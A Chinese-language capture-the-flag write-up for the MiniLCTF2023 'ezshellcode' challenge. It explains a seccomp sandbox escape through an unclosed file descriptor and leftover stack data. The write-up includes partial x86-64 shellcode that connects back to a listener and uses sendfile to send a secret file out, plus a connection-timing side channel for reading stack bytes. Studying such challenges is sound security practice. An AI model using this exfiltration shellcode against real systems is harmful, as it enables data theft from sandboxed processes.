# MiniLCTF2023 - ezshellcode

## 题目简述

程序把环境变量 flag 分成 `flag1`、`flag2` 两个文件，读取二者后清空标准输入输出，安装只允许 `exit`、`socket`、`connect`、`sendfile` 的 seccomp。选手最多提交 `0x40` 字节 shellcode；在执行前，程序还用 48 字节前缀把通用寄存器、`rsp` 和 `rbp` 全部清零。

源码的人为混淆主要利用数字 `1` 与字母 `l` 的相似性。还原变量后可见两个独立缺陷：`flag2` 的文件描述符未关闭，`flag1` 的栈缓冲区未清零。

## 解题过程

读取顺序决定 `flag1` 的 `fd1=3`、`flag2` 的 `fdl=4`。清理代码却是：

```c
close(fd1);
close(fd1);
memset(buf1, 0, sizeof(buf1));
memset(buf1, 0, sizeof(buf1));
```

因此 fd 3 被重复关闭，fd 4 仍指向 `flag2`；`buf1` 被重复清零，而保存 `flag1` 的 `bufl` 留在已返回函数的旧栈帧中。

第一半使用 fd 4。由于 0、1、2 已关闭，shellcode 新建的 socket 通常取得 fd 0；连接回自己的监听端后，调用 `sendfile(socket_fd, 4, NULL, length)` 即可把 `flag2` 发出。`rsp=0` 时不能直接 `push`，官方思路先用 `mov rsp, fs:[0x300]` 恢复一个可用栈地址：

```asm
mov rsp, qword ptr fs:[0x300]
mov eax, 41                 /* socket */
mov edi, 2                  /* AF_INET */
mov esi, 1                  /* SOCK_STREAM */
syscall
xchg rdi, rax

/* 在栈上放 sockaddr_in，并令 rsi=rsp、rdx=0x10 */
mov eax, 42                 /* connect */
syscall

mov eax, 40                 /* sendfile */
mov esi, 4                  /* 未关闭的 flag2 */
xor edx, edx
mov r10d, 0x40
syscall
```

第二半从旧栈帧恢复 `flag1`。官方调试结果以 `fs:[0x300]` 为基准向低地址移动约 2144 字节，再逐字节猜测目标内容。shellcode先连接回监听端，随后比较目标字节：猜中就进入无限循环，猜错就调用 `exit`。监听端用 `poll` 判断连接是否持续存在，即可形成一位/一字节侧信道。

```asm
mov rsp, qword ptr fs:[0x300]
/* socket + connect，建立用于观测存活状态的连接 */
sub sp, 2144
mov dl, byte ptr [rsp + OFFSET]
cmp dl, GUESS
je matched
mov eax, 60                 /* exit */
syscall
matched:
jmp matched
```

逐位置枚举可打印字符，遇到 `}` 或换行后停止，再把两半拼接。仓库只保留了空的 flag 占位文件，官方 README 也明确说明 exp 未写完整，因此无法从现有证据恢复具体 flag 字符串；本文只记录源码能够证明的完整利用方法，不伪造结果。

## 方法总结

沙箱题要同时审计资源生命周期和残留内存：重复 `close` 留下可直接 `sendfile` 的 fd，重复 `memset` 留下可侧信道读取的栈数据。寄存器清零并未清理 TLS，`fs` 段仍能提供恢复栈位置的锚点。没有直接输出通道时，连接存活时间本身也可编码比较结果。
